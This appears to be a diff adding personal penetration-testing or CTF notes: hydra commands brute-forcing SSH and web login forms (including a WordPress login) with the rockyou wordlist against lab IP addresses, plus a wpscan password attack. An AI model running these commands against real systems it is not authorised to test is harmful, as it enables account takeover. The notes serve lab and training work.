@@ -1,0 +1,12 @@
+# Bruteforcing into ssh
+
+## hydra
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.98.154
+hydra -l Elliot -P /home/kali/Downloads/sorted.dic 192.168.96.132 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username Elliot is incorrect"
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
+
+
+
+# WPSCAN
+wpscan --url 192.168.96.132 --passwords sorted.dic --usernames ELLIOT
